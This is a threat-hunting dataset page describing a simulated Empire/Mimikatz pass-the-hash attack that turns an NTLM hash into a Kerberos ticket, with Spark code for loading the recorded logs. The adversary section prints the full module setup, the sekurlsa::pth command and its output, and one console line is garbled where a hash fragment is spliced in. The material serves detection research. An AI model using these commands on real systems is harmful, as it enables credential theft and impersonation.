# Empire Mimikatz OPTH

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190319131123 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/03/19 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz |

## Dataset Description
This dataset represents adversaries taking a hash into a fully-fledged Kerberos TGT

## Adversary View
```
(Empire: 8BLV6USC) > usemodule credentials/mimikatz/pth*
(Empire: powershell/credentials/mimikatz/pth) > info

              Name: Invoke-Mimikatz PTH
            Module: powershell/credentials/mimikatz/pth
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to execute
  sekurlsa::pth to create a new process. with a specific
  user's hash. Use credentials/tokens to steal the token
  afterwards.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com
  http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-
  hash-with-mimikatz/

Options:

  Name   Required    Value                     Description
  ----   --------    -------                   -----------
  CredID False                                 CredID from the store to use for ticket 
                                              creation.                               
  domain False                                 The fully qualified domain name.        
  ntlm   False                                 The NTLM hash to use.                   
  user   False                                 Username to impersonate.                
  Agent  True        8BLV6USC                  Agent to run module on.                 

4f81f8c89a2a384f4a68credentials/mimikatz/pth) > set ntlm b415baa073a1 
(Empire: powershell/credentials/mimikatz/pth) > set user Mmidge
(Empire: powershell/credentials/mimikatz/pth) > set domain shire.com
(Empire: powershell/credentials/mimikatz/pth) > execute
[*] Tasked 8BLV6USC to run TASK_CMD_JOB
[*] Agent 8BLV6USC tasked with task ID 3
[*] Tasked agent 8BLV6USC to run module powershell/credentials/mimikatz/pth
(Empire: powershell/credentials/mimikatz/pth) > Job started: 6DH2RP
Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::pth /user:Mmidge /domain:shire.com /ntlm:b415baa073a14f81f8c89a2a384f4a68
user	: Mmidge
domain	: shire.com
program	: cmd.exe
impers.	: no
NTLM	: b415baa073a14f81f8c89a2a384f4a68
  |  PID  7920
  |  TID  8308
  |  LSA Process is now R/W
  |  LUID 0 ; 85924706 (00000000:051f1b62)
  \_ msv1_0   - data copy @ 000001BD859AEBA0 : OK !
  \_ kerberos - data copy @ 000001BD85999068
  \_ aes256_hmac       -> null             
  \_ aes128_hmac       -> null             
  \_ rc4_hmac_nt       OK
  \_ rc4_hmac_old      OK
  \_ rc4_md4           OK
  \_ rc4_hmac_nt_exp   OK
  \_ rc4_hmac_old_exp  OK
  \_ *Password replace @ 000001BD85902A78 (32) -> null


Use credentials/token to steal the token of the created PID.

(Empire: powershell/credentials/mimikatz/pth) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        